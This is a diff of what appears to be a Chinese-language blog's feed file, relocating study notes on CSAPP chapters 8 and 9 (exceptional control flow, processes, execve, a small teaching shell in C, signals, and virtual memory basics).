-<h5 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h5><p>​    execve函数在当前进程的上下文加载并运行一个新程序。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    execve函数加载并运行可执行目标文件filename，且带参数列表argv和环境变量列表envp。只有当出现错误时，例如找不到filename，execve才会返回到调用程序，所以，与fork一次调用两次返回不同，execve调用一次不返回。</p>
-<p>​    argv变量指向一个以null结尾的指针数组，其中每个指针都指向一个参数字符串，按惯例，argv[0]是可执行文件的名字，环境变量的列表是由一个类似的数据结构表示的，envp变量指向一个以null结尾的指针数组，其中每个指针指向一个环境变量字符串。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/93.png" class="">
-
-<p>在exceve加载了filename之后，调用一些启动代码，启动代码设置栈，并将控制传递给新程序的主函数，该主函数有如下形式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    当main开始执行时，用户的栈组织结构如下图所示，从栈底（高地址）往栈顶（低地址）看，首先是参数和环境字符串，栈网上紧随其后的是以null结尾的指针数组，其中每个指针都指向栈中一个环境变量字符串，全局变量environ指向这些指针中的第一个envp[0]，紧跟环境变量数组之后的是以null结尾的argv[]数组，其中每个元素都指向栈中的一个参数字符串，在栈顶部是系统启动函数libc_start_main的栈帧。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/94.png" class="">
-
-<p>main函数又3个参数：</p>
-<ol>
-<li>argc,它给出argv[]数组中非空指针的数目</li>
-<li>argv，指向argv[]数组中的第一条目</li>
-<li>envp，指向envp[]数组中的第一个条目</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tsh&gt; &quot;</span>);</span><br><span class="line">        fgets(cmdline,MAXLINE,<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; </span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	eval(cmdline);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg;                 <span class="comment">/*should the job run in bg or fg?*/</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    stpcpy(buf,cmdline);</span><br><span class="line">    bg = parseline(buf,argv);</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;     <span class="comment">/*ignore empty line*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123;                         <span class="comment">/*not a build in cmd*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((pid = fork())==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found. \n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!bg)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">int</span> status;</span><br><span class="line">        	<span class="keyword">if</span>(waitpid(pid, &amp;status, <span class="number">0</span>)&lt;<span class="number">0</span>)</span><br><span class="line">        		unix_error(<span class="string">&quot;waitfg:waitpid\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>,pid,cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27; &#x27;</span>;  <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">	buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	buf++;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) &#123;</span><br><span class="line">	argv[argc++] = buf;</span><br><span class="line">	*delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	buf = delim + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">	       buf++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	    buf++;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">	argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span>    <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h4><p>信号是一种更高层的软件形式的异常，它允许进程和内核中断其他进程。一个信号就是一条小消息，它通知进程系统中发生一个某种类型的事件。每种信号对应某种系统事件，低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的，信号提供一种机制，通知用户进程发生了这些异常，比如，一个进程试图除以0，那么内核就会发送一个SIGFPE信号，如果一个进程执行一条非法指令，那么内核就发送给它一个SIGSEGV信号。下图为linux信号。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/95.png" class="">
-
-<h2 id="第九章：虚拟内存"><a href="#第九章：虚拟内存" class="headerlink" title="第九章：虚拟内存"></a>第九章：虚拟内存</h2><p>什么是虚拟内存？</p>
-<p>​    内存容易被破坏，如果一个进程写入了另一个进程使用的内存，就有可能会造成崩溃。虚拟内存是对主存概念的抽象概念。</p>
-<p>用虚拟内存的好处：</p>
-<ul>
-<li>根据特定的需要在磁盘和主存之间告诉高速传输数据，从而高效使用缓存</li>
-<li>为每个进程提供相同的地址空间，从而简化内存管理</li>
-<li>保护每个内存空间的进程不被其他进程破坏</li>
-</ul>
-<h4 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h4><p>早期PC：物理寻址</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/96.png" class="">
-
-<p>近代PC：虚拟寻址</p>
-<p>​    CPU生成虚拟地址访问主存，虚拟地址被送到主存之前首先通过MMU转换为物理地址</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/97.png" class="">
-
-
-
-<h4 id="9-2-地址空间"><a href="#9-2-地址空间" class="headerlink" title="9.2 地址空间"></a>9.2 地址空间</h4><p>非负整数地址的有序集合，在地址空间中的整数通常是连续的，我们称之为<strong>线性地址空间</strong>。</p>
-<h4 id="9-3-虚拟内存作为缓存工具"><a href="#9-3-虚拟内存作为缓存工具" class="headerlink" title="9.3 虚拟内存作为缓存工具"></a>9.3 虚拟内存作为缓存工具</h4><p>概念上而言，可以将虚拟内存（VM）理解为一个由存放在磁盘上的m个连续的字节大小的单元所组成的数组。</p>
-<p>VM系统将虚拟内存分割为虚拟页，同时将物理内存分割为物理页，每个页大小为2^p字节。</p>
-<p>在任意时刻，虚拟页面的集合都被分为三个不相交的子集：</p>
-<ul>
-<li>未分配的VM系统还未分配（或者创建）的页。未分配的块没有</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CSAPP</category>
+        <category>软件安全</category>
       </categories>
   </entry>
   <entry>
@@ -1732,6 +1479,259 @@
 
 
 <p>编辑器在汇编代码中放入命令**.align 8**,指明了全局数据所需的对齐。保证了后面的数据的起始地址是8的倍数。</p>
+]]></content>
+      <categories>
+        <category>CSAPP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>深入理解计算机系统三</title>
+    <url>/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="第八章：异常控制流"><a href="#第八章：异常控制流" class="headerlink" title="第八章：异常控制流"></a>第八章：异常控制流</h2><p><strong>控制流：</strong></p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/78.png" class="">
+
+<h4 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h4><p>​    异常是异常控制流的一种形式，一部分由硬件实现，一部分由操作系统实现，这一节中主要是对异常和异常处理有一个一般性的了解。异常就是控制流中的突变，用来相应处理器状态中的某些变化。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/79.png" class="">
+
+<p>在任何情况下，当处理器检测到有事件发生，会通过一张叫<strong>异常表</strong>的跳转表，进行一个间接过程调用（异常），到一个专门设计用来处理这类时间的操作系统子程序（<strong>异常处理程序</strong>）。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
+
+<p>当异常处理程序完成以后，根据引起异常的事件类型会发生以下三种情况的一种：</p>
+<ol>
+<li><p>处理程序将控制返回给当前的指令Icurr，即当事件发生时正在执行的指令。</p>
+</li>
+<li><p>处理程序将控制返回给Inext，如果没有发生异常将会执行的下一条指令。</p>
+</li>
+<li><p>处理程序终止被中断的程序。</p>
+</li>
+</ol>
+<h5 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h5><p>系统中为每种类型的异常分配了唯一的非负整数的异常号，一些是处理器的设计者分配的，其他是操作系统内核设计者分配的。</p>
+<ul>
+<li>​    前者包括被0除，缺页，内存访问违例，断点及算术溢出。</li>
+<li>​    后者包括系统调用和来自外部IO设备的信号。</li>
+</ul>
+<p>系统启动时，会初始化一张异常表的跳转表，使条目k包含异常k的处理程序地址。</p>
+<p>在运行时，处理器检测到发生了一个事件，并确定了相应的<strong>异常号</strong>k，随后，处理器触发异常，方法是执行间接过程调用，通过异常表的条目k转到相应的处理程序。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
+
+<p>异常表的起始地址放在一个叫做<strong>异常表基质寄存器</strong>的特殊CPU寄存器中。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/81.png" class="">
+
+<p>异常处理过程类似于调用但有一些不同：</p>
+<ul>
+<li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中，然而根据异常的类型，返回地址要么是当前指令，要么是下一条指令。</li>
+<li>处理器也把一些额外的处理器状态压入栈里，在处理程序返回时，重新开始执行被中断的程序可能会需要这些状态。</li>
+<li>如果控制从用户程序转移到内核，所有这些项目都被压入栈中，而不是用户栈中。</li>
+<li>异常处理程序运行在内核模式下，意味着它们对所有的系统资源都有完全的访问权限。</li>
+</ul>
+<h5 id="8-1-2-异常的类型"><a href="#8-1-2-异常的类型" class="headerlink" title="8.1.2 异常的类型"></a>8.1.2 异常的类型</h5><p>异常可以分为四类：中断、陷阱、故障、终止。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/84.jpg" class="">
+
+<p><strong>中断：</strong></p>
+<p>中断是<strong>异步</strong>发生的，来自处理器外部的I/O设备的信号的结果。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.png" class="">
+
+<p>在当前指令完成执行之后，处理器注意到中断引脚的电压变高了，就从系统总线读取异常号，然后调用适当的中断程序。当处理程序返回时，它就将控制返回给下一条指令。结果就好像程序继续执行，好像没有发生过中断一样。</p>
+<p>剩下的异常类型（陷阱、故障和终止）是同步执行的，是执行当前指令的结果，我们把这类指令叫做<strong>故障指令</strong>。</p>
+<p><strong>陷阱和系统调用:</strong></p>
+<p>陷阱是有意的异常，是执行一条指令的结果。</p>
+<p>陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.5.png" class="">
+
+<p>​    用户程序经常需要向内核请求服务。为了允许对这些服务的受控访问，处理器提供了一条特殊的“syscall n”指令，当用户程序想要请求服务n时，可以执行这条指令。执行syscall指令会导致一个到异常处理程序的陷阱，这个 处理程序解析参数，并调用适当的内核程序。</p>
+<p>​    函数调用是在用户模式，系统调用在内核模式。</p>
+<p><strong>故障和终止：</strong></p>
+<p>故障是由错误情况引起的，它可能被故障处理程序修正。如果被修正，则将控制转移到当前指令。</p>
+<p>如果不可修正，则终止，终止处理程序不会将控制返回给应用程序。将返回一个abort例程，该例程将终止程序。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/83.png" class="">
+
+<h5 id="8-1-3-Linux-x86-64系统中的异常"><a href="#8-1-3-Linux-x86-64系统中的异常" class="headerlink" title="8.1.3 Linux/x86-64系统中的异常"></a>8.1.3 Linux/x86-64系统中的异常</h5><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/85.png" class="">
+
+<ol>
+<li><p><strong>Linux/x86-64故障和终止：</strong></p>
+<ul>
+<li>除法错误。</li>
+<li>一般保护故障。通常是一个程序引用了一个未定义的虚拟内存空间，或者程序试图写一个只读的文本。Linux shell一般报告为“段故障”</li>
+<li>缺页是会重新执行产生故障的指令的一个异常示例。</li>
+<li>机器检查。机器检查是在导致故障的指令执行中检查到致命的硬件错误时发生的。</li>
+</ul>
+</li>
+<li><p><strong>Linux/x86-64系统调用：</strong></p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/86.png" class=""></li>
+</ol>
+<h4 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h4><p>​    在现代操作系统上运行一个程序时，会得到一个假象，就好像程序时目前系统中唯一的程序，程序似乎独占处理器和内存等等假象都通过进程的概念提供给我们的。</p>
+<pre><code> 进程提供给应用程序的关键抽象：
+</code></pre>
+<ul>
+<li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占的使用处理器。</li>
+<li>一个私有的地址空间，提供一个假象，好像我们的程序独占的使用内存系统。</li>
+</ul>
+<h5 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h5><p>​    即使在系统中通常有许多其他程序在运行，进程也可以像每个程序提供一种假象，好像它在独占的使用处理器，如果想用调试器单步执行程序，会看到一系列PC值，这些值唯一的对应包含在程序的可执行目标文件中的指令，或是包含在运行时动态连接到程序的共享对象的指令，这个PC值的序列叫做<strong>逻辑控制流</strong>。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/87.png" class="">
+
+<h5 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h5><p>计算机系统中逻辑流有许多不同形式，异常处理程序、进程、信号处理程序、线程等都是逻辑流的例子。</p>
+<p>一个逻辑流的执行在时间上与另一个流重叠，称为<strong>并发流</strong>。</p>
+<p>时间片：一个进程执行它的控制流的一部分的每一时间段。</p>
+<p>多任务：一个进程和其他进程轮流运行（也叫时间分片）</p>
+<p>并发：多个流并发执行的一般现象。</p>
+<p>并行流：两个流并发的运行在不同的处理机核或者计算机上，它们并行地运行。</p>
+<h5 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h5><p>私有地址空间—进程为程序提供的假象，好像它独占的使用系统地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读写的。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/88.png" class="">
+
+<h5 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h5><p>​    处理器提供一种机制，限制一个应用可以执行的指令以及它可以访问的地址空间范围。通常是通过控制某个寄存器的模式位来提供这种功能，该寄存器描述了进程当前享有的特权。</p>
+<ul>
+<li>​    设置模式位之后，进程出域内核模式，也叫做超级用户模式，这个进程可以执行指令集中的任何指令，并且可以访问系统中的任何内存位置。</li>
+<li>​    没有设置模式位，进程运行在用户模式，用户模式中的进程不允许执行特权指令，比如停止处理器、改变模式位、发起IO操作、不允许引用地址空间中内核区的代码和数据，这样的尝试都会引起故障。用户程序必须通过系统调用接口间接的访问内核代码和数据。</li>
+</ul>
+<p> linux提供了一种机制，叫做/proc文件系统，允许用户模式进程访问内核数据结构中的内容。</p>
+<p>/proc文件系统将许多内核数据的内容输出为一个用户程序可以读的文本文件的层次结构。</p>
+<h5 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h5><p>​    操作系统内核使用一种称为上下文切换的较高层次的异常控制流来实现多任务。上下文切换机制是建立在上面讨论过的低层的异常机制上的。</p>
+<p>​    内核为每个进程维持一个<strong>上下文</strong>，上下文就是内核重新启动一个被抢占的进程所需要的状态，由一些对象的值组成，包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内存栈和各种内核数据结构，比如描述地址空间的页表、包含当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。</p>
+<p>下图为一对进程上下文切换的示例，进程A初始运行在用户模式在，直到执行系统调用read陷入内核，内核中的陷阱处理程序请求来自磁盘控制器的DMA传输，并安排在磁盘控制器完成从磁盘到内存的数据传输后，磁盘中断处理器：</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/89.png" class="">
+
+<p>上下文切换：</p>
+<ol>
+<li>保存当前进程的上下文。</li>
+<li>恢复某个先前被强占的进程被保存的上下文。</li>
+<li>将控制传递给这个新恢复的进程。</li>
+</ol>
+<h4 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h4><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/90.png" class="">
+
+<h4 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h4><h5 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h5><p>每个进程都有唯一的正数（非0）进程ID（PID），getpid函数返回调用进程的PID，getppid函数返回他的父进程的PID（创建调用进程的进程）。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span>；</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>在Linux系统上pid_t被定义为int类型。</p>
+<h5 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h5><p>从程序员角度，可以认为进程总是处于下面三种状态之一：</p>
+<ul>
+<li>运行。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</li>
+<li>停止。进程的执行被挂起，且不会被调度，当收到SIGSTOP、SIGTSTP、SIGTTIN或者SIGTTOU信号时，进程会停止，并保持停止直到它收到一个SIGCONT信号，在这个时刻，进程再次开始运行。</li>
+<li>终止。进程永远的停止，进程会因为三种原因终止：<ol>
+<li>收到一个信号，该信号的默认行为是终止进程。</li>
+<li>从主程序返回。</li>
+<li>调用exit函数。</li>
+</ol>
+</li>
+</ul>
